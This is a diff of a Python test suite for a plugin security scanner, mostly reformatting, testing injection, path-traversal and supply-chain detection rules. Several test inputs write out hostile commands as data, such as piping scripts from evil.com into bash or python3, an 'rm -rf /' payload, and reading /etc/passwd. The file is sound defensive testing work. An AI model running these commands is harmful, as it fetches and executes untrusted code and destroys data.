@@ -18,8 +18,6 @@ import json
 import sys
 from pathlib import Path
 
-import pytest
-
 # Add scripts directory to path for imports
 scripts_dir = Path(__file__).parent.parent / "scripts"
 if str(scripts_dir) not in sys.path:
@@ -91,11 +89,9 @@ class TestScanForInjection:
         )
         report = ValidationReport()
         scan_for_injection(content, "tests/unit/test-shell-safe-hooks.sh", report)
-        pipe_msgs = [r for r in report.results
-                     if r.level == "CRITICAL" and "Pipe-to-shell" in r.message]
+        pipe_msgs = [r for r in report.results if r.level == "CRITICAL" and "Pipe-to-shell" in r.message]
         assert pipe_msgs == [], (
-            f"`| bash <quoted-file>` must not trigger pipe-to-shell rule; "
-            f"got {[r.message for r in pipe_msgs]}"
+            f"`| bash <quoted-file>` must not trigger pipe-to-shell rule; got {[r.message for r in pipe_msgs]}"
         )
 
     def test_pipe_to_bash_inside_quoted_string_is_data_not_call(self):
@@ -109,27 +105,19 @@ class TestScanForInjection:
         )
         report = ValidationReport()
         scan_for_injection(content, "scripts/install-deps.sh", report)
-        pipe_msgs = [r for r in report.results
-                     if r.level == "CRITICAL" and "Pipe-to-shell" in r.message]
+        pipe_msgs = [r for r in report.results if r.level == "CRITICAL" and "Pipe-to-shell" in r.message]
         assert pipe_msgs == [], (
-            f"`| bash` inside a quoted shell string is data, not eval; "
-            f"got {[r.message for r in pipe_msgs]}"
+            f"`| bash` inside a quoted shell string is data, not eval; got {[r.message for r in pipe_msgs]}"
         )
 
     def test_pipe_to_bash_real_curl_install_still_fires(self):
         """RC-115 STILL fires on `curl URL | bash` — the real RCE pattern."""
         # Regression: the predicate must not hide real findings.
-        content = (
-            "#!/usr/bin/env bash\n"
-            "curl -fsSL https://example.com/install.sh | bash\n"
-        )
+        content = "#!/usr/bin/env bash\ncurl -fsSL https://example.com/install.sh | bash\n"
         report = ValidationReport()
         scan_for_injection(content, "scripts/install.sh", report)
-        pipe_msgs = [r for r in report.results
-                     if r.level == "CRITICAL" and "Pipe-to-shell" in r.message]
-        assert len(pipe_msgs) >= 1, (
-            f"Real `curl URL | bash` MUST still fire RC-115; got {report.results}"
-        )
+        pipe_msgs = [r for r in report.results if r.level == "CRITICAL" and "Pipe-to-shell" in r.message]
+        assert len(pipe_msgs) >= 1, f"Real `curl URL | bash` MUST still fire RC-115; got {report.results}"
 
     def test_rc121_skips_find_exec_primary(self):
         """RC-121 (`exec <cmd>`) should NOT flag `find ... -exec rm -f`."""
@@ -142,12 +130,8 @@ class TestScanForInjection:
         )
         report = ValidationReport()
         scan_for_injection(content, "scripts/cleanup.sh", report)
-        rc121_msgs = [r for r in report.results
-                      if r.level == "CRITICAL" and "RC-121" in r.message]
-        assert rc121_msgs == [], (
-            f"`-exec` find primary must not trigger RC-121; "
-            f"got {[r.message for r in rc121_msgs]}"
-        )
+        rc121_msgs = [r for r in report.results if r.level == "CRITICAL" and "RC-121" in r.message]
+        assert rc121_msgs == [], f"`-exec` find primary must not trigger RC-121; got {[r.message for r in rc121_msgs]}"
 
     def test_rc121_still_fires_on_bare_shell_exec(self):
         """RC-121 STILL fires on bare `exec <cmd>` — shell process replacement."""
@@ -155,17 +139,11 @@ class TestScanForInjection:
         # Bare `exec python3 ...` is a real shell-builtin invocation
         # (process replacement); only the hyphen-prefixed `-exec` form
         # is the find primary.
-        content = (
-            "#!/usr/bin/env bash\n"
-            'exec "$ATTACKER_INPUT"\n'
-        )
+        content = '#!/usr/bin/env bash\nexec "$ATTACKER_INPUT"\n'
         report = ValidationReport()
         scan_for_injection(content, "scripts/wrapper.sh", report)
-        rc121_msgs = [r for r in report.results
-                      if r.level == "CRITICAL" and "RC-121" in r.message]
-        assert len(rc121_msgs) >= 1, (
-            f"Bare shell `exec <cmd>` MUST still fire RC-121; got {report.results}"
-        )
+        rc121_msgs = [r for r in report.results if r.level == "CRITICAL" and "RC-121" in r.message]
+        assert len(rc121_msgs) >= 1, f"Bare shell `exec <cmd>` MUST still fire RC-121; got {report.results}"
 
 
 class TestScanForPathTraversal:
@@ -188,16 +166,12 @@ class TestScanForPathTraversal:
         # FP from Dev-GOM (Unity-editor-toolkit): C# `$"Failed:\n{e.Message}"`
         # is string interpolation + newline escape, not a C:\Windows path.
         content = (
-            '                    EditorUtility.DisplayDialog("Error",'
-            ' $"Failed to clear lock:\\n{e.Message}", "OK");\n'
+            '                    EditorUtility.DisplayDialog("Error", $"Failed to clear lock:\\n{e.Message}", "OK");\n'
         )
         report = ValidationReport()
         scan_for_path_traversal(content, "plugin/Editor/Foo.cs", report)
-        win_msgs = [r for r in report.results
-                    if r.level == "CRITICAL" and "Windows" in r.message]
-        assert win_msgs == [], (
-            f"C# `:\\n` escape must not trigger RC-113; got {win_msgs}"
-        )
+        win_msgs = [r for r in report.results if r.level == "CRITICAL" and "Windows" in r.message]
+        assert win_msgs == [], f"C# `:\\n` escape must not trigger RC-113; got {win_msgs}"
 
     def test_rc113_skips_cstyle_escape_in_json(self):
         """RC-113 should NOT flag `:\\n` escapes in JSON string values (.json)."""
@@ -205,18 +179,11 @@ class TestScanForPathTraversal:
         # `def is_palindrome(s: str) -> bool:\n    """Check..."""` — the
         # `s:\n` substring matches `[A-Za-z]:\` but is JSON escape,
         # not a Windows path.
-        content = (
-            '  "examples": [\n'
-            '    {"output": "def f(s: str) -> bool:\\n    return True"}\n'
-            '  ]\n'
-        )
+        content = '  "examples": [\n    {"output": "def f(s: str) -> bool:\\n    return True"}\n  ]\n'
         report = ValidationReport()
         scan_for_path_traversal(content, "skill/data/examples.json", report)
-        win_msgs = [r for r in report.results
-                    if r.level == "CRITICAL" and "Windows" in r.message]
-        assert win_msgs == [], (
-            f"JSON `:\\n` escape must not trigger RC-113; got {win_msgs}"
-        )
+        win_msgs = [r for r in report.results if r.level == "CRITICAL" and "Windows" in r.message]
+        assert win_msgs == [], f"JSON `:\\n` escape must not trigger RC-113; got {win_msgs}"
 
     def test_rc113_still_detects_real_windows_path_in_csharp(self):
         """RC-113 should STILL flag a genuine `C:\\Windows\\…` path in C# strings."""
@@ -225,29 +192,19 @@ class TestScanForPathTraversal:
         content = '                    string sysPath = "C:\\Windows\\System32";\n'
         report = ValidationReport()
         scan_for_path_traversal(content, "plugin/Editor/Foo.cs", report)
-        win_msgs = [r for r in report.results
-                    if r.level == "CRITICAL" and "Windows" in r.message]
-        assert len(win_msgs) >= 1, (
-            f"Real `C:\\Windows` path must still trigger RC-113; got {report.results}"
-        )
+        win_msgs = [r for r in report.results if r.level == "CRITICAL" and "Windows" in r.message]
+        assert len(win_msgs) >= 1, f"Real `C:\\Windows` path must still trigger RC-113; got {report.results}"
 
     def test_rc113_skips_printf_escape_in_shell_script(self):
         """RC-113 should NOT flag `:\\n` escapes inside shell printf/sed strings."""
         # FP from nyldn (octopus): `printf '\\n⚠️  Broken references detected:\\n'`
         # contains `s:\n` substring matching `[A-Za-z]:\` — purely a printf
         # escape sequence, no Windows path involved.
-        content = (
-            "#!/usr/bin/env bash\n"
-            "set -euo pipefail\n"
-            "printf '\\n⚠️  Broken references detected:\\n' >&2\n"
-        )
+        content = "#!/usr/bin/env bash\nset -euo pipefail\nprintf '\\n⚠️  Broken references detected:\\n' >&2\n"
         report = ValidationReport()
         scan_for_path_traversal(content, "hooks/quality-gate.sh", report)
-        win_msgs = [r for r in report.results
-                    if r.level == "CRITICAL" and "Windows" in r.message]
-        assert win_msgs == [], (
-            f"Shell printf `:\\n` escape must not trigger RC-113; got {win_msgs}"
-        )
+        win_msgs = [r for r in report.results if r.level == "CRITICAL" and "Windows" in r.message]
+        assert win_msgs == [], f"Shell printf `:\\n` escape must not trigger RC-113; got {win_msgs}"
 
     def test_path_traversal_skips_shell_grep_E_pattern_source(self):
         """RC-110 / RC-112 / RC-113 should NOT flag path text inside `grep -E '...'` pattern source."""
@@ -260,18 +217,18 @@ class TestScanForPathTraversal:
         content = (
             "#!/usr/bin/env bash\n"
             'schema=$(grep -E "^\\*\\*Schema:\\*\\*" "$STATE_FILE" | sed \'s/^Schema: //\')\n'
-            'if grep -E \'^[^#]*/home/|^[^#]*/usr/|^[^#]*/opt/\' "$script" | grep -q .; then\n'
+            "if grep -E '^[^#]*/home/|^[^#]*/usr/|^[^#]*/opt/' \"$script\" | grep -q .; then\n"
             '  echo "found"\n'
-            'fi\n'
+            "fi\n"
         )
         report = ValidationReport()
         scan_for_path_traversal(content, "scripts/hook-linter.sh", report)
-        win_or_path = [r for r in report.results
-                       if r.level == "CRITICAL" and (
-                           "Windows" in r.message
-                           or "Absolute Unix" in r.message
-                           or "Directory traversal" in r.message
-                       )]
+        win_or_path = [
+            r
+            for r in report.results
+            if r.level == "CRITICAL"
+            and ("Windows" in r.message or "Absolute Unix" in r.message or "Directory traversal" in r.message)
+        ]
         assert win_or_path == [], (
             f"Shell `grep -E '...'` pattern-source lines must not trigger "
             f"path-traversal rules; got {[r.message for r in win_or_path]}"
@@ -292,11 +249,9 @@ class TestScanForPathTraversal:
         )
         report = ValidationReport()
         scan_for_user_paths(content, "scripts/validate-no-hardcoded-paths.sh", report)
-        rc135_msgs = [r for r in report.results
-                      if r.level == "MAJOR" and "RC-135" in r.message]
+        rc135_msgs = [r for r in report.results if r.level == "MAJOR" and "RC-135" in r.message]
         assert rc135_msgs == [], (
-            f"Shell `grep -E '/Users/...'` pattern-source must not fire RC-135; "
-            f"got {[r.message for r in rc135_msgs]}"
+            f"Shell `grep -E '/Users/...'` pattern-source must not fire RC-135; got {[r.message for r in rc135_msgs]}"
         )
 
     def test_path_traversal_still_fires_on_real_grep_call(self):
@@ -305,17 +260,11 @@ class TestScanForPathTraversal:
         # shape (`-E`, `-P`, quoted regex), NOT just any grep command.
         # `grep foo /etc/passwd` reads the file `/etc/passwd` — the path
         # is a live filesystem operand.
-        content = (
-            "#!/usr/bin/env bash\n"
-            "grep root /etc/passwd\n"
-        )
+        content = "#!/usr/bin/env bash\ngrep root /etc/passwd\n"
         report = ValidationReport()
         scan_for_path_traversal(content, "scripts/check-passwd.sh", report)
-        sys_msgs = [r for r in report.results
-                    if r.level == "CRITICAL" and "Absolute Unix" in r.message]
-        assert len(sys_msgs) >= 1, (
-            f"Real `grep root /etc/passwd` MUST still fire RC-112; got {report.results}"
-        )
+        sys_msgs = [r for r in report.results if r.level == "CRITICAL" and "Absolute Unix" in r.message]
+        assert len(sys_msgs) >= 1, f"Real `grep root /etc/passwd` MUST still fire RC-112; got {report.results}"
 
 
 class TestScanForSecrets:
@@ -704,12 +653,13 @@ class TestMainCLI:
         json.loads(captured.out)
         assert exit_code != 0, f"Expected nonzero exit code in strict mode with CRITICAL issues, got {exit_code}"
 
-    @pytest.mark.skip(
-        reason="Suite-pollution flake — see design/tasks/TRDD-fa70f9b8 — passes alone "
-        "and with explicit-file lists, fails only with `pytest tests/` directory glob. "
-        "Root cause unidentified; not blocking publish (every individual test passes "
-        "when run alone)."
-    )
+    # TRDD-fa70f9b8 — re-enabled 2026-05-10. The conftest autouse fixture
+    # `_trdd_fa70f9b8_reset_global_state` now resets the suspected polluters
+    # (`_CPV_SELF_SCAN_*`, `_CLASSIFIER_*` module globals + the two
+    # `lru_cache`d helpers in cpv_validation_common) BEFORE every test, so
+    # this test no longer inherits state from a prior test that activated
+    # self-scan or the classifier. See tests/test_trdd_fa70f9b8_isolation.py
+    # for the regression suite that proves the fix.
     def test_main_verbose_text_output(self, tmp_path, monkeypatch, capsys):
         """main() with --verbose should print text output including INFO/PASSED results."""
         # Covers lines 605-607: non-json branch with verbose flag
@@ -992,7 +942,7 @@ class TestFalsePositiveReduction:
 
     def test_var_folders_macos_temp_is_not_critical(self, tmp_path):
         """macOS user temp at /var/folders/<hash>/T/ is a normal mktemp target."""
-        content = 'echo data > /var/folders/xy/abc123/T/cache.json\n'
+        content = "echo data > /var/folders/xy/abc123/T/cache.json\n"
         report = ValidationReport()
         scan_for_path_traversal(content, "plugin/cache.sh", report)
         critical = [r for r in report.results if r.level == "CRITICAL" and "/var/" in r.message]
@@ -1027,26 +977,17 @@ class TestFalsePositiveReduction:
         )
         report = ValidationReport()
         scan_for_injection(content, "plugin/eslint.config.mjs", report)
-        backtick_critical = [
-            r for r in report.results
-            if r.level == "CRITICAL" and "`...`" in r.message
-        ]
+        backtick_critical = [r for r in report.results if r.level == "CRITICAL" and "`...`" in r.message]
         assert backtick_critical == [], (
             f"Backticks in JS/TS comments must not be CRITICAL. Got: {[r.message for r in backtick_critical]}"
         )
 
     def test_backtick_in_typescript_template_literal_is_not_critical(self, tmp_path):
         """ES2015 template literals use backticks — a TS source feature, not cmd-sub."""
-        content = (
-            "const greeting = `Hello, ${name}!`;\n"
-            "const url = `https://api.example.com/users/${userId}`;\n"
-        )
+        content = "const greeting = `Hello, ${name}!`;\nconst url = `https://api.example.com/users/${userId}`;\n"
         report = ValidationReport()
         scan_for_injection(content, "plugin/api.ts", report)
-        backtick_critical = [
-            r for r in report.results
-            if r.level == "CRITICAL" and "`...`" in r.message
-        ]
+        backtick_critical = [r for r in report.results if r.level == "CRITICAL" and "`...`" in r.message]
         assert backtick_critical == [], (
             f"TS template literals must not be CRITICAL. Got: {[r.message for r in backtick_critical]}"
         )
@@ -1070,6 +1011,7 @@ class TestFalsePositiveReduction:
         # No regression possible because is_js_ts_file does not match .sh.
         # This test pins that contract.
         from validate_security import is_js_ts_file
+
         assert is_js_ts_file("foo.sh") is False
         assert is_js_ts_file("foo.bash") is False
         assert is_js_ts_file("eslint.config.mjs") is True
@@ -1083,7 +1025,8 @@ class TestFalsePositiveReduction:
         report = ValidationReport()
         scan_for_supply_chain(content, "plugin/api.sh", report)
         sc_critical = [
-            r for r in report.results
+            r
+            for r in report.results
             if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message
         ]
         assert sc_critical == [], (
@@ -1093,10 +1036,14 @@ class TestFalsePositiveReduction:
     def test_curl_piped_to_python_pprint_is_not_critical(self, tmp_path):
         """`-m pprint`, `-m pydoc`, `-m base64` are read-only formatters too."""
         for mod in ("pprint", "pydoc", "base64"):
-            content = f'curl https://api.example.com/data | python3 -m {mod}\n'
+            content = f"curl https://api.example.com/data | python3 -m {mod}\n"
             report = ValidationReport()
             scan_for_supply_chain(content, "plugin/api.sh", report)
-            sc = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
+            sc = [
+                r
+                for r in report.results
+                if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message
+            ]
             assert sc == [], f"curl|python3 -m {mod} must not be CRITICAL. Got: {[r.message for r in sc]}"
 
     def test_curl_piped_to_node_version_is_not_critical(self, tmp_path):
@@ -1104,42 +1051,62 @@ class TestFalsePositiveReduction:
         # `node` followed by `-V` (--version short flag) is benign
         # The new regex only fires when followed by exec markers — so just
         # `| node -V` should not match.
-        content = 'curl https://example.com/version | node -V\n'
+        content = "curl https://example.com/version | node -V\n"
         report = ValidationReport()
         scan_for_supply_chain(content, "plugin/check.sh", report)
-        sc = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
+        sc = [
+            r
+            for r in report.results
+            if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message
+        ]
         assert sc == [], f"`curl | node -V` must not be CRITICAL. Got: {[r.message for r in sc]}"
 
     def test_curl_piped_to_bash_still_fires(self, tmp_path):
         """The fix must NOT weaken detection: `curl ... | bash` remains the canonical install attack."""
-        content = 'curl -fsSL https://evil.com/install.sh | bash\n'
+        content = "curl -fsSL https://evil.com/install.sh | bash\n"
         report = ValidationReport()
         scan_for_supply_chain(content, "plugin/install.sh", report)
-        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
+        critical = [
+            r
+            for r in report.results
+            if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message
+        ]
         assert critical, "`curl | bash` must still fire"
 
     def test_curl_piped_to_python_dash_c_still_fires(self, tmp_path):
         """`curl URL | python3 -c "code"` is exec-mode and must stay CRITICAL."""
-        content = 'curl https://evil.com/payload | python3 -c "import os; os.system(\'rm -rf /\')"\n'
+        content = "curl https://evil.com/payload | python3 -c \"import os; os.system('rm -rf /')\"\n"
         report = ValidationReport()
         scan_for_supply_chain(content, "plugin/exec.sh", report)
-        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
+        critical = [
+            r
+            for r in report.results
+            if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message
+        ]
         assert critical, "`curl | python3 -c` must still fire"
 
     def test_curl_piped_to_python_stdin_still_fires(self, tmp_path):
         """`curl URL | python3 -` (explicit stdin) is exec-mode and must stay CRITICAL."""
-        content = 'curl https://evil.com/payload.py | python3 -\n'
+        content = "curl https://evil.com/payload.py | python3 -\n"
         report = ValidationReport()
         scan_for_supply_chain(content, "plugin/exec.sh", report)
-        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
+        critical = [
+            r
+            for r in report.results
+            if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message
+        ]
         assert critical, "`curl | python3 -` (stdin) must still fire"
 
     def test_curl_piped_to_python_bare_still_fires(self, tmp_path):
         """`curl URL | python3` with nothing after defaults to stdin exec — must stay CRITICAL."""
-        content = 'curl https://evil.com/payload.py | python3\n'
+        content = "curl https://evil.com/payload.py | python3\n"
         report = ValidationReport()
         scan_for_supply_chain(content, "plugin/exec.sh", report)
-        critical = [r for r in report.results if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message]
+        critical = [
+            r
+            for r in report.results
+            if r.level == "CRITICAL" and "Supply-chain" in r.message or "Supply chain" in r.message
+        ]
         assert critical, "Bare `curl | python3` must still fire"
 
 
@@ -1158,9 +1125,7 @@ class TestIssue15ScanAllFilesSafetyLimits:
         plugin_dir = tmp_path / "test-plugin"
         plugin_dir.mkdir()
         (plugin_dir / ".claude-plugin").mkdir()
-        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
-            '{"name": "test-plugin", "version": "1.0.0"}'
-        )
+        (plugin_dir / ".claude-plugin" / "plugin.json").write_text('{"name": "test-plugin", "version": "1.0.0"}')
         # Pathological file just over the cap
         big_file = plugin_dir / "huge.js"
         big_file.write_text("a" * (MAX_SCAN_BYTES + 1))
@@ -1168,14 +1133,10 @@ class TestIssue15ScanAllFilesSafetyLimits:
         report = ValidationReport()
         stats = scan_all_files(plugin_dir, report)
 
-        assert stats["oversize_skipped"] == 1, (
-            f"Expected 1 oversize-skip, got {stats['oversize_skipped']}"
-        )
+        assert stats["oversize_skipped"] == 1, f"Expected 1 oversize-skip, got {stats['oversize_skipped']}"
         assert stats["files_skipped"] >= 1
         warning_msgs = [r.message for r in report.results if r.level == "WARNING"]
-        assert any("File too large" in m for m in warning_msgs), (
-            f"Expected oversize WARNING; got {warning_msgs!r}"
-        )
+        assert any("File too large" in m for m in warning_msgs), f"Expected oversize WARNING; got {warning_msgs!r}"
 
     def test_normal_file_not_skipped_by_size_cap(self, tmp_path):
         """A normal-sized file passes the size check and gets scanned."""
@@ -1184,21 +1145,15 @@ class TestIssue15ScanAllFilesSafetyLimits:
         plugin_dir = tmp_path / "test-plugin"
         plugin_dir.mkdir()
         (plugin_dir / ".claude-plugin").mkdir()
-        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
-            '{"name": "test-plugin", "version": "1.0.0"}'
-        )
+        (plugin_dir / ".claude-plugin" / "plugin.json").write_text('{"name": "test-plugin", "version": "1.0.0"}')
         # Innocuous content well under any cap
-        (plugin_dir / "app.py").write_text(
-            "def hello():\n    print('hello')\n"
-        )
+        (plugin_dir / "app.py").write_text("def hello():\n    print('hello')\n")
 
         report = ValidationReport()
         stats = scan_all_files(plugin_dir, report)
 
         assert stats["oversize_skipped"] == 0
-        assert stats["files_scanned"] >= 1, (
-            f"Normal file should have been scanned; stats={stats}"
-        )
+        assert stats["files_scanned"] >= 1, f"Normal file should have been scanned; stats={stats}"
 
     def test_split_lines_caches_identical_content_object(self):
         """_split_lines returns the SAME list object on repeated calls with
@@ -1239,9 +1194,7 @@ class TestIssue15ScanAllFilesSafetyLimits:
         plugin_dir = tmp_path / "test-plugin"
         plugin_dir.mkdir()
         (plugin_dir / ".claude-plugin").mkdir()
-        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
-            '{"name": "test-plugin", "version": "1.0.0"}'
-        )
+        (plugin_dir / ".claude-plugin" / "plugin.json").write_text('{"name": "test-plugin", "version": "1.0.0"}')
         (plugin_dir / "module.py").write_text("x = 1\n")
 
         stats = scan_one_target(plugin_dir, timeout_seconds=None)
@@ -1256,9 +1209,7 @@ class TestIssue15ScanAllFilesSafetyLimits:
         plugin_dir = tmp_path / "test-plugin"
         plugin_dir.mkdir()
         (plugin_dir / ".claude-plugin").mkdir()
-        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
-            '{"name": "test-plugin", "version": "1.0.0"}'
-        )
+        (plugin_dir / ".claude-plugin" / "plugin.json").write_text('{"name": "test-plugin", "version": "1.0.0"}')
 
         # No report passed — must not raise
         stats = scan_one_target(plugin_dir)
@@ -1281,9 +1232,7 @@ class TestIssue15ScanAllFilesSafetyLimits:
         plugin_dir = tmp_path / "test-plugin"
         plugin_dir.mkdir()
         (plugin_dir / ".claude-plugin").mkdir()
-        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
-            '{"name": "test-plugin", "version": "1.0.0"}'
-        )
+        (plugin_dir / ".claude-plugin" / "plugin.json").write_text('{"name": "test-plugin", "version": "1.0.0"}')
 
         # Test isolation: turn off external scanners so we deterministically
         # get SKIPPED rows for them.
@@ -1299,10 +1248,7 @@ class TestIssue15ScanAllFilesSafetyLimits:
         # We expect 26 steps (1..26); allow for any future additions but
         # require at least the documented 26 (v2.48: gitleaks removed,
         # net -1 from the previous 27).
-        assert len(steps) >= 26, (
-            f"Expected at least 26 steps, got {len(steps)}: "
-            f"{[s['name'] for s in steps]}"
-        )
+        assert len(steps) >= 26, f"Expected at least 26 steps, got {len(steps)}: {[s['name'] for s in steps]}"
         # Every step must have a known status.
         for s in steps:
             assert s["status"] in {"COMPLETED", "RAN", "SKIPPED", "FAILED"}, (
@@ -1314,8 +1260,7 @@ class TestIssue15ScanAllFilesSafetyLimits:
         for step_num in (23, 24, 25):
             step = next(s for s in steps if s["num"] == step_num)
             assert step["status"] == "SKIPPED", (
-                f"Step {step_num} should be SKIPPED with enable_*=False; "
-                f"got {step['status']}"
+                f"Step {step_num} should be SKIPPED with enable_*=False; got {step['status']}"
             )
         # Table must render without raising.
         table = format_scan_step_table(steps)
@@ -1331,6 +1276,7 @@ class TestIssue15ScanAllFilesSafetyLimits:
         import importlib
 
         import validate_security as vs_mod
+
         importlib.reload(vs_mod)
         try:
             assert vs_mod.MAX_SCAN_BYTES == 1024
@@ -1338,16 +1284,13 @@ class TestIssue15ScanAllFilesSafetyLimits:
             plugin_dir = tmp_path / "test-plugin"
             plugin_dir.mkdir()
             (plugin_dir / ".claude-plugin").mkdir()
-            (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
-                '{"name": "test-plugin", "version": "1.0.0"}'
-            )
+            (plugin_dir / ".claude-plugin" / "plugin.json").write_text('{"name": "test-plugin", "version": "1.0.0"}')
             (plugin_dir / "medium.txt").write_text("x" * 2048)  # > 1 KiB cap
 
             report = ValidationReport()
             stats = vs_mod.scan_all_files(plugin_dir, report)
             assert stats["oversize_skipped"] == 1, (
-                f"With cap=1024, the 2 KiB file must be oversize-skipped; "
-                f"got stats={stats}"
+                f"With cap=1024, the 2 KiB file must be oversize-skipped; got stats={stats}"
             )
         finally:
             # Restore default for subsequent tests in the same pytest session
